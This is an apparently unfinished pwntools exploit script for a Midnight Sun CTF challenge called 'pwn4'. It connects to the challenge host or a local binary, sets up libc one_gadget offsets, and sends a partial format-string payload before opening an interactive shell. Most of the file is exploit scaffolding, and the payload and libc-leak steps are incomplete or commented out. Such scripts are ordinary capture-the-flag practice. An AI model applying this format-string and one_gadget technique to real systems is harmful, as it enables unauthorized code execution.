import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='pwn4'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('pwn2-01.play.midnightsunctf.se', 10002)
# pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		io.recvuntil("user: ")
		pay='%'+str(0x8048C87)+'c%'
		io.sendline(pay)
		






		# success('libc_base:'+hex(libc_base))
		pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue